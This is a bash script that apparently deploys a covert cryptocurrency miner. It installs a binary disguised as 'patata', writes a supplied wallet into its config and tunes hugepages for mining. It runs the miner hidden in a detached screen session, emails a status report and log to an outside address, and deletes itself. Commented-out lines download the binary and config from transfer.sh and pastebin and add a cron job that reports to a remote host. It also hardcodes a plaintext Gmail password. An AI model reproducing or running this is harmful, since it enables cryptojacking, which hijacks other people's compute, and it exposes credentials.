#!/bin/bash
 
if [ $# -eq 0 ]; then
    echo "No wallet provided"
    rm -- "$0"
    exit 1
fi
 

sudo debconf-set-selections <<< "postfix postfix/mailname string salchipapa.llameante@gmail.com"
sudo debconf-set-selections <<< "postfix postfix/main_mailer_type string 'Internet Site'"
sudo apt-get -y install libmicrohttpd-dev mailutils ssmtp unzip
sudo rm master.zip
#cd /home/patata-master
sudo chmod +x /etc/ssmtp
sudo chmod +x /etc/ssmtp/ssmtp.conf
sudo bash -c 'echo "AuthUser=salchipapa.llameante@gmail.com" >> /etc/ssmtp/ssmtp.conf'
sudo bash -c 'echo "AuthPass=tuculoesmio" >> /etc/ssmtp/ssmtp.conf'
sudo bash -c 'echo "mailhub=smtp.gmail.com:587" >> /etc/ssmtp/ssmtp.conf'
sudo bash -c 'echo "UseSTARTTLS=YES" >> /etc/ssmtp/ssmtp.conf'
#wget https://transfer.sh/CVVrP/patata
sudo chmod +x /home/patata-master/patata
#wget -O /home/config.txt https://pastebin.com/raw/ez38Jpxi
sudo sed -i "18s/.*/\""$1"\"/" /home/patata-master/config.txt
sudo sysctl -w vm.nr_hugepages=128
sudo bash -c 'echo "* soft memlock 262144" >> /etc/security/limits.conf'
sudo bash -c 'echo "* hard memlock 262144" >> /etc/security/limits.conf'
cd /home
screen -dm sudo /home/patata-master/patata /home/patata-master/config.txt
 
if [ $# -eq 2 ]
  then
    sleep 10    
    echo `ps -C patata -o %cpu,%mem,cmd` | mail --attach=/home/pesetas.log -s "Encendido de $HOSTNAME del proyecto `hostname -d`" $2
	#(crontab -u "$USER" -l ; echo "*/5 * * * * curl --data 'status=up&account=$2&instance=$HOSTNAME&project=`hostname -d`' http://lifter-fortuna.1d35.starter-us-east-1.openshiftapps.com/lifter") | crontab -u "$USER" -
fi
 

sudo rm -- "$0"


